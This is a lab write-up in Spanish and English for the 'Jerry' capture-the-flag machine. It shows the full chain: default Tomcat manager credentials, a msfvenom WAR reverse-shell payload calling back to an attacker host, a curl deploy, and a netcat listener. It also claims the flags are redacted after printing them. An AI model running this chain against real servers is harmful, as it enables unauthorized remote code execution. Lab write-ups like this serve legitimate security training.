---
title: "Jerry — Tomcat Exploitation Lab"
description: "Writeup y documentación técnica completa del laboratorio Jerry (Tomcat WAR Upload → Reverse Shell)."
author: "deox420"
date: "2025-12-01"
difficulty: "Principiante"
tags: ["CTF", "Windows", "Tomcat", "WAR", "Reverse Shell", "Web Exploitation"]
services: ["http", "tomcat"]
platform: "Windows Server"
environment: "The Hackers Labs / VirtualBox"
source: "jerry_logs.txt"
---

# Jerry — Writeup Completo (Tomcat WAR Upload → Reverse Shell)

> Nota: este writeup está generado a partir de registros de comando y salidas facilitadas. He preservado la evidencia técnica y añadido análisis, hipótesis y explicaciones pedagógicas. Las flags y credenciales se muestran como placeholders para publicación segura.

## 🧭 Entorno y contexto
Máquina objetivo con servicio **Apache Tomcat** expuesto en TCP/8080.  
El escenario es un clásico de misconfiguración de Tomcat: panel manager accesible con credenciales débiles, posibilidad de desplegar archivos WAR no firmados que permiten ejecución de código remoto (JSP).  
Plataforma objetivo: Windows (evidenciado por el prompt `C:\Users\Administrator\...` en la salida).  

**IPs observadas en los registros:**
- Escaneo Nmap: `10.129.7.217` (host escaneado).  
- Despliegue via curl: `10.129.47.221` (posible typo o NAT diferente).  
**Nota:** Hay una discrepancia en las IPs observadas; en la sección Reproducibilidad documentaré ambas y dejaré placeholders. Asumo que la IP objetivo correcta es la usada en el escaneo (`10.129.7.217`) salvo indicación en contrario.

---

## 📝 Resumen ejecutivo
- **Objetivo:** obtener una shell remota y extraer flags `user.txt` y `root.txt` (ocultadas aquí).  
- **Vector principal:** panel Tomcat Manager accesible → despliegue de WAR malicioso (payload Java JSP) → reverse shell.  
- **Acceso inicial:** desplegado `shell.war` via Tomcat Manager con credenciales `tomcat:s3cret`.  
- **Ejecución:** msfvenom generado WAR con payload `java/jsp_shell_reverse_tcp`; servidor atacante escucha con netcat para capturar la reverse shell.  
- **Post-explotación:** la máquina resultó ser Windows; se listaron y leyeron archivos en `C:\Users\Administrator\Desktop\flags` que contienen `user.txt` y `root.txt`.  
- **Impacto:** compromiso total de la máquina con ejecución remota de código; en entornos reales, esto permitiría escalada lateral, persistencia y exfiltración de datos.  
- **Estado para publicación:** flags ocultadas en este documento.

---

# 1) 🔍 Reconocimiento — hallazgos y contexto técnico

### 1.1 Escaneo ejecutado
```bash
nmap -p- -T4 -sCV 10.129.7.217
```

**Salida relevante (extracto):**
```text
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

**Análisis:** Tomcat 7.0.88 indicated by the HTTP title. Service manager likely present (`/manager/html`). Tomcat 7 allows deployments via manager if credentials are available.

### 1.2 Observaciones técnicas
- Host with a single open port reported in this scan: 8080.  
- Server banner: `Apache-Coyote/1.1`.  
- Nmap does not show other open ports (possible firewall or filtered).

---

# 2) 📡 Enumeración / descubrimiento (correlaciones and signals)

### 2.1 Panel manager detected
Documented presence of manager:

```
/manager/html
```

Credentials observed / default:

```
tomcat:s3cret
```

**Analyst hypothesis:** credentials are available and unchanged; can authenticate to Tomcat Manager to deploy WARs.

### 2.2 Upload possibility
Tomcat Manager supports endpoints to deploy via HTTP (`/manager/text/deploy`). If upload allowed, possible to include JSP reverse shell in WAR.

**Reference:** common pattern of deploying malicious WAR to obtain RCE.

---

# 3) 🚪 Ataque inicial — payload generation and deployment

### 3.1 WAR generation with msfvenom
Recorded command:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.31.181.206 LPORT=4444 -f war -o shell.war
```

**Analysis:** Payload will open a reverse TCP connection from the JSP to `LHOST:LPORT`. Replace placeholder LHOST with attacker's IP.

### 3.2 WAR deploy via Manager
Recorded deployment:

```bash
curl -u tomcat:s3cret -T shell.war "http://10.129.47.221:8080/manager/text/deploy?path=/shell&update=true"
```

Response:

```text
OK - Deployed application at context path /shell
```

**Note on IP discrepancy:** curl target IP differs from nmap scan IP; see Reproducibility.

---

# 4) 💻 Access and reverse shell reception

### 4.1 Listener
Recorded listener:

```bash
nc -lvnp 4444
```

### 4.2 Windows shell evidence
Commands executed on the remote Windows shell and outputs recorded:

```
C:\Users\Administrator\Desktop\flags>dir
...
06/19/2018  06:11 AM                88 2 for the price of 1.txt
...
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

We redact actual flags in this report.

---

# 5) 🔎 Post-exploitation local enumeration recommendations

Typical post-exploitation commands on Windows (not all present in logs, but recommended):

- `whoami` / `whoami /all`  
- `systeminfo`  
- `ipconfig /all`  
- `net user`  
- `net localgroup administrators`  
- Inspect filesystem: `dir`, `type`, inspect `C:\Users\Administrator\Desktop`, `ProgramData`, `C:\inetpub` etc.

Logs show access to Administrator's Desktop flags directory — strong indicator of high privileged context.

---

# 6) ⬆️ Risk tuples and impact analysis

### Severity and likelihood
- **Severity:** Critical — remote code execution leads to full compromise.  
- **Likelihood:** High when manager is reachable and credentials are weak/default.  
- **Root cause:** default credentials + enabled manager deployments.

### Impact in real environments
- Data exfiltration, lateral movement, persistence, backdoor installation, service disruption.

---

# 7) 📁 Evidence excerpts

```text
Nmap:
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88

Curl deploy:
OK - Deployed application at context path /shell

Reverse shell (Windows):
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
user.txt
[FLAG USER REDACTADA]

root.txt
[FLAG ROOT REDACTADA]
```

---

# 8) 🔧 Reproducibility — commands (placeholders)

```bash
# Scan
nmap -p- -T4 -sCV <TARGET_IP>

# Build WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# Deploy WAR (requires manager credentials)
curl -u <USER>:<PASS> -T shell.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/shell&update=true"

# Listener
nc -lvnp <LPORT>
```

---

## 🧰 Tools used
Nmap, msfvenom, curl, nc, Windows CMD utilities (dir/type).

---

## 🛡️ Mitigations recommended
1. Disable or restrict Tomcat Manager to admin networks.  
2. Change default tomcat credentials and integrate centralized auth.  
3. Restrict deployment endpoints and require signed artifacts.  
4. Firewall 8080 to only trusted hosts.  
5. Monitor deployments and outbound connections for reverse shells.

---

## 🔍 Pedagogical takeaways
- Manager endpoints are high-risk; test deploy functionality only in controlled labs.  
- Default credentials remain one of the most common misconfigurations exploited.  
- WAR upload + JSP payload is platform-agnostic and can give access to any OS hosting Tomcat.


**Documento generado y compilado por deox420.**
